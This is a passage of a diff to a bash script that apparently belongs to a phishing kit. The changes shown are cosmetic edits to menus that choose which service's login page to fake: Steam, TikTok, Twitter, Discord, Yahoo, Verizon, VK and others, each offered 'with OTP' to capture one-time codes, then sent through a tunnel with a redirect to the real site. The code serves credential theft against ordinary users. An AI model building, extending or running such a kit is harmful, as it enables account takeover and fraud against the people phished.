 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="spotify"
                 tunnelmenu;;
@@ -2353,15 +2320,14 @@ siname="Stackoverflow"
 rdurl="stackoverflow.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="stackoverflow"
                 tunnelmenu;;
@@ -2379,15 +2345,14 @@ siname="Steam"
 rdurl="store.steampowered.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="steam"
                 tunnelmenu;;
@@ -2426,16 +2391,15 @@ siname="TikTok"
 rdurl="www.tiktok.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="tiktok"
                 tunnelmenu;;
@@ -2458,9 +2422,9 @@ echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="twitch"
                 tunnelmenu;;
@@ -2481,15 +2445,14 @@ siname="Twitter"
 rdurl="twitter.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="twitter"
                 tunnelmenu;;
@@ -2507,15 +2470,14 @@ siname="ubereats"
 rdurl="www.ubereats.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="ubereats"
                 tunnelmenu;;
@@ -2533,15 +2495,14 @@ siname="Verizon"
 rdurl="www.verizon.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="verizon"
                 tunnelmenu;;
@@ -2566,16 +2527,15 @@ siname="VK"
 rdurl="vk.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="vk"
                 tunnelmenu;;
@@ -2603,15 +2563,14 @@ siname="Wordpress"
 rdurl="wordpress.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="wordpress"
                 tunnelmenu;;
@@ -2629,15 +2588,14 @@ siname="Xbox"
 rdurl="www.xbox.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="xbox"
                 tunnelmenu;;
@@ -2655,15 +2613,14 @@ siname="Yahoo"
 rdurl="yahoo.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="yahoo"
                 tunnelmenu;;
@@ -2681,15 +2638,14 @@ siname="Yandex"
 rdurl="yandex.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="yandex"
                 tunnelmenu;;
@@ -2707,15 +2663,14 @@ siname="YT subs"
 rdurl="www.youtube.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="ytsubs"
                 tunnelmenu;;
@@ -2734,15 +2689,14 @@ siname="Discord"
 rdurl="www.discord.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="discord"
                 tunnelmenu;;
@@ -2761,9 +2715,9 @@ rdurl="www.jio.com/business/jiofi"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="jiorouter"
                 tunnelmenu;;
